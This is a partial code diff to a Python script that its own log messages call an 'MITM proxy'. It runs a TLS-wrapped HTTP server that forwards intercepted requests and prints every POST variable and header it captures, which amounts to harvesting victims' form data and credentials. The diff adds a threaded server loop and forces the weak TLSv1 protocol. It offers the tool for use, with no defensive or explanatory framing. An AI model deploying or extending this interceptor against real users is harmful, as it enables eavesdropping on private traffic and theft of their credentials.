@@ -1,20 +1,14 @@
-from socketserver import TCPServer, ThreadingMixIn, StreamRequestHandler
-import ssl
 import http.client
-import os
-import socket
-import codecs
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import ssl
-import netifaces as ni
-from scapy.all import *
-import subprocess
+import socketserver
 from cgi import parse_header, parse_multipart
 from urllib.parse import parse_qs
 import http.client, urllib.parse
 
 
-host_ip = "192.168.0.23"
+stop = 1
+
 
 class MyHandler(BaseHTTPRequestHandler):
 
@@ -36,13 +30,11 @@ class MyHandler(BaseHTTPRequestHandler):
 
             self.wfile.write(b'HTTP/1.1 200 OK')
             for h in r1.headers:
-                if str(h) != 'Vary':
-                    self.send_header(h, r1.headers[h])
+                self.send_header(h, r1.headers[h])
             self.end_headers()
             self.wfile.write(data1)
         except Exception as e:
             print(e)
-
 
     def parse_POST(self):
         ctype, pdict = parse_header(self.headers['content-type'])
@@ -69,7 +61,7 @@ class MyHandler(BaseHTTPRequestHandler):
 
         print("\t\tPOST variables:")
         for v in postvars:
-            print('\t\t\t', v, ": ", postvars[v])
+            print("\t\t\t", v, ": ", postvars[v])
         print("\n")
         hs = {}
         for h in self.headers:
@@ -86,7 +78,24 @@ class MyHandler(BaseHTTPRequestHandler):
         self.wfile.write(data1)
 
 
+class ForkingHTTPServer(socketserver.ThreadingMixIn, HTTPServer):
+    def finish_request(self, request, client_address):
+        request.settimeout(30)
+        # "super" can not be used because BaseServer is not created from object
+        HTTPServer.finish_request(self, request, client_address)
 
-httpd = HTTPServer((host_ip, 4433), MyHandler)
-httpd.socket = ssl.wrap_socket (httpd.socket, certfile='cert.pem', keyfile='key.pem', server_side=True, cert_reqs=ssl.CERT_OPTIONAL)
-httpd.serve_forever()
+
+def start_server(host_ip):
+    global stop
+    while stop:
+        try:
+            print("[*] MITM proxy running...")
+            httpd = ForkingHTTPServer((host_ip, 4433), MyHandler)
+            httpd.socket = ssl.wrap_socket(httpd.socket, certfile='cert.pem', keyfile='key.pem', server_side=True,
+                                           cert_reqs=ssl.CERT_OPTIONAL, ssl_version=ssl.PROTOCOL_TLSv1)
+            httpd.serve_forever()  # serve_forever
+        except Exception as e:
+            print(str(e))
+        finally:
+            httpd.socket.close()
+            print("[*] MITM proxy stopped")
